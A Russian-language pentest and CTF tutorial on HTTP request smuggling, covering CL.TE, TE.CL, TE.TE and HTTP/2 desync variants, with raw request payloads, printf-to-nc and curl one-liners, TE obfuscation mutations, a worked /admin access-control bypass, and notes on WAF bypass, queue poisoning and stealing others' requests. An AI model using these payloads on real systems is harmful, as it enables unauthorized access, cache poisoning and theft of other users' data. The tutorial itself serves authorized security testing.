**HTTP Request Smuggling** (десинхронизация) — это эксплуатация расхождений в том, как **разные** HTTP-парсеры (reverse-proxy и backend) определяют границы запроса. Если фронтенд видит один запрос, а бэкенд — два (или наоборот), можно «спрятать» запрос: обойти контроль доступа, отравить кэш, захватить чужой запрос. Это один из самых сложных и самых ценных классов.

## Теория: где возникает расхождение

Границу тела запроса задают два заголовка:

- `Content-Length` (CL) — длина тела в байтах;
- `Transfer-Encoding: chunked` (TE) — тело разбито на чанки.

Проблема — когда оба заголовка присутствуют или когда они «мутированы»:

1. **CL.TE:** фронтенд использует `Content-Length`, бэкенд — `Transfer-Encoding`.
2. **TE.CL:** фронтенд использует `Transfer-Encoding`, бэкенд — `Content-Length`.
3. **TE.TE:** оба поддерживают TE, но один игнорирует «замусоренный» TE (`Transfer-Encoding: xchunked`, `Transfer-Encoding : chunked`, двойной TE).

Классический CL.TE payload:

```
POST / HTTP/1.1
Host: target
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

Фронтенд (CL=13) считает, что тело — 13 байт, и пропускает всё как один запрос. Бэкенд (TE) видит `0\r\n\r\n` как конец тела, а `SMUGGLED` — как **начало следующего запроса**. Второй запрос «приклеится» к следующему пользовательскому запросу, что даёт обход проверок или захват чужого запроса.

## Теория: HTTP/2 и десинхронизация

HTTP/2 добавляет свои нюансы:

- **H2.CL / H2.TE:** фронтенд говорит по HTTP/2, но бэкенд по HTTP/1.1; заголовок `content-length`/`transfer-encoding` в H2 может быть передан в H1 и создать десинк.
- **CRLF в значении заголовка H2:** HTTP/2 допускает `\r\n` в значении заголовка, а при переводе в H1 они превращаются в настоящие переводы строк → инъекция заголовков/запросов.
- **`h2c` smuggling:** апгрейд HTTP/1.1→HTTP/2 на уровне бэкенда.
- **Request splitting через `:path`/`:method`:** спецсимволы в псевдозаголовках.

Также сюда относится **HTTP/2 request tunnelling**: через `Content-Length` внутри H2-потока можно «туннелировать» вложенный запрос.

## Инструменты: Burp и ручная отправка

Основной инструмент — **Burp Suite** с расширением **HTTP Request Smuggler** (Detect / Smuggle). Оно автоматически проверяет CL.TE, TE.CL, TE.TE и H2-варианты.

Ручная проверка CL.TE через `nc` (сырые байты):

```bash
printf 'POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED' | nc target 80
```

Важно: не «грepать» вывод наугад — смотрите тайминги и ответы. Десинк часто проявляется **таймаутом** (бэкенд ждёт окончания «следующего» запроса) или несоответствием ответа.

Проверка через curl (ограниченно — curl нормализует заголовки):

```bash
curl -s --http1.1 -X POST https://target/ \
  -H 'Content-Length: 13' -H 'Transfer-Encoding: chunked' \
  --data-binary $'0\r\n\r\nSMUGGLED'
```

## Разобранный пример: обход фронтенд-контроля доступа

Схема: фронтенд блокирует `/admin` (проверяет путь), но бэкенд — нет.

Шаг 1. Отправляем «нормальный» запрос к разрешённому пути, но с «приклеенным» запросом к `/admin`:

```
POST / HTTP/1.1
Host: target
Content-Length: 54
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-Ignore: X
```

Бэкенд видит первый запрос (к `/`), затем — второй (`GET /admin`), который **не проходил** через проверку фронтенда. Если `/admin` вернёт данные — обход подтверждён.

Шаг 2. Проверяем результат чтением (а не предположением): в ответе должен быть контент админки или 200 на `/admin`.

Шаг 3. Надёжнее — **response queue poisoning**: «отравить» очередь так, чтобы следующий пользователь получил ваш ответ. Это опасно и может задеть других, поэтому в рамках теста ограничьтесь доказательством «front-end bypass» и не атакуйте чужой трафик.

## Разобранный пример: обход WAF

WAF (фронтенд) проверяет первый запрос, а «спрятанный» второй обходит правила. Например, WAF блокирует `UNION SELECT`, но если он видит только внешний запрос, спрятанный в теле пройдёт. Это классическое применение smuggling для WAF bypass.

## Частые ошибки

- **Тестировать на общем проде.** Smuggling влияет на других пользователей (queue poisoning). Согласуйте тест и минимизируйте.
- **Игнорировать тайминги.** Десинк часто проявляется задержкой, а не «очевидным» ответом.
- **Использовать curl.** curl нормализует заголовки и «чинит» payload; для smuggling нужен Burp или `nc`.
- **Забывать про HTTP/2.** Большинство современных стеков за H2; проверяйте H2.CL/H2.TE и CRLF-в-H2.
- **Путать с обычной инъекцией заголовков.** Smuggling — про расхождение границ тела между парсерами.
- **Не фиксировать точную версию стека.** Уязвимость зависит от пары фронтенд/бэкенд (nginx+uwsgi, HAProxy+Node и т.д.).

## Полный разбор: подтверждение CL.TE и TE.CL (с выводом)

Работаем сырыми байтами через Burp Repeater (отключите «Update Content-Length»).

**CL.TE** (фронт по CL, бэкенд по TE):

```
POST / HTTP/1.1
Host: target
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

Здесь `Content-Length: 13` покрывает `0\r\n\r\nSMUGGLED`. Фронтенд пропускает как один запрос; бэкенд читает чанк `0` (конец тела), а `SMUGGLED` — как начало следующего. Признак: **таймаут** (бэкенд ждёт конца «следующего» запроса) или «неправильный» ответ.

**TE.CL** (фронт по TE, бэкенд по CL):

```
POST / HTTP/1.1
Host: target
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```

Здесь бэкенд (CL=3) читает только `8\r\n` и считает запрос завершённым, а `SMUGGLED...` остаётся в соединении.

**Детект без влияния на других** (безопасный приём): отправить «hidden» запрос, который заведомо вернёт 404, и посмотреть, вернёт ли фронтенд **два** ответа на один запрос:

```bash
# через nc / Burp: ожидаем два статуса в выводе при успешном десинке
printf 'POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 44\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /404xyz HTTP/1.1\r\nX: X' | nc target 80
```

Если видите `HTTP/1.1 404` (на спрятанный `/404xyz`) в дополнение к основному ответу — десинк есть.

## Reference-таблица: типы десинка и payload'ы

| Тип | Фронт | Бэкенд | Ключевая идея |
|-----|-------|--------|---------------|
| CL.TE | CL | TE | фронт режет по CL, бэк по чанкам |
| TE.CL | TE | CL | фронт режет по чанкам, бэк по CL |
| TE.TE | TE | TE | один игнорирует «мусорный» TE |
| CL.0 | CL | — | бэкенд игнорирует тело |
| H2.CL | H2 | H1 | CL в H2 переносится в H1 |
| H2.TE | H2 | H1 | TE в H2 переносится в H1 |
| H2 CRLF | H2 | H1 | CRLF в значении заголовка |
| HTTP/2 tunnelling | H2 | H1 | вложенный запрос через CL |

Мутации TE для TE.TE: `Transfer-Encoding: xchunked`, `Transfer-Encoding : chunked`, `Transfer-Encoding: chunked, chunked`, `Transfer-Encoding: chunked\r\nTransfer-Encoding: x`, `Transfer-Encoding: x\r\nTransfer-Encoding: chunked`.

## H2 smuggling: H2.CL, H2.TE, CRLF в заголовках

HTTP/2 не использует CL/TE для границ, но фронтенд может пересобирать запрос в HTTP/1.1 для бэкенда:

- **H2.CL:** добавьте заголовок `content-length` в H2-запрос — при переводе в H1 бэкенд может использовать его для границы.
- **H2.TE:** аналогично с `transfer-encoding: chunked`.
- **CRLF в значении:** в H2 `\r\n` в значении заголовка легальны; при переводе в H1 они становятся реальными переводами строк → инъекция заголовков/запросов:

```
foo: bar\r\n
Content-Length: 0\r\n
\r\n
GET /admin HTTP/1.1\r\n
```

- **Псевдозаголовки:** манипуляция `:method`/`:path`/`:authority` может рассинхронизировать маршрутизацию.

Burp HTTP Request Smuggler умеет проверять эти варианты автоматически (вкладка «HTTP/2»).

## Request tunnelling и response queue poisoning

- **Request tunnelling:** в H2-потоке через `Content-Length` «туннелируют» вложенный H1-запрос к бэкенду, обходя фронтенд-проверки.
- **Response queue poisoning:** спрятанный запрос встаёт в очередь так, что **следующий** пользователь получает ответ на ваш запрос (например, вашу сессию/её данные). Это критично, но задевает других — доказывайте минимально и в согласованных рамках.
- **Cache poisoning via smuggling:** спрятанный запрос может отравить кэш (см. `web-cache-poisoning`).
- **Credential theft:** при удачном стечении можно получить чужой запрос с cookie в теле.

## Что делать дальше / решение

1. **Определить пару слоёв** (nginx+Varnish, HAProxy+Node, AWS ALB+...).
2. **Прогнать HTTP Request Smuggler** (Detect) — CL.TE/TE.CL/TE.TE/H2.
3. **Ручное подтверждение** сырыми байтами (Burp/`nc`), смотреть тайминги и двойные ответы.
4. **Доказать bypass** (front-end control) на своём запросе, без queue poisoning чужого трафика.
5. **Проверить H2-варианты** (H2.CL/TE, CRLF, tunnelling).
6. **Оценить impact** (обход ACL, WAF bypass, cache poisoning) и оформить PoC.
7. **Не травить общую очередь** без согласования — риск задеть пользователей.

## Автоматизация детекта

- **Burp HTTP Request Smuggler:** вкладка Detect прогоняет CL.TE/TE.CL/TE.TE и H2-варианты; затем вручную подтверждайте.
- **`smuggler.py`** (defparam) — CLI-детект.
- **`h2csmuggler`** — проверка h2c-апгрейда.
- **Скрипт на Python (`h2`):** для точного контроля H2-потоков и CRLF-инъекций.

```bash
python3 smuggler.py -u https://target/ --method POST
```

Всегда подтверждайте находку вручную (сырыми байтами), так как сканеры дают ложные срабатывания из-за особенностей парсинга. Не тестируйте queue poisoning на живых пользователях.

## Признаки десинка без «явного» второго ответа

- **Таймаут** на запросе, который обычно быстр: бэкенд ждёт конца «спрятанного» запроса.
- **Несоответствие ответа запросу:** возвращается контент другого пути/статус.
- **Разница в поведении** при отправке через Burp и через curl (curl нормализует).
- **WAF-блок только на одном варианте:** обфускация TE проходит.
- **`X-Cache`/кэш-аномалии:** отравление через спрятанный запрос.

Всегда подтверждайте сырыми байтами и не полагайтесь на один индикатор — ложные срабатывания часты.

## Где пригодится

- **CTF (Web):** smuggling-задачи требуют точной ручной отправки и понимания стека.
- **Bug bounty:** десинк — один из самых высокооплачиваемых классов (Critical), но требует аккуратного PoC.
- **Пентест:** проверка smuggling входит в тестирование прокси/балансировщиков и WAF.
- **Работа (AppSec/Dev):** согласованная обработка CL/TE на всех слоях — требование к инфраструктуре.
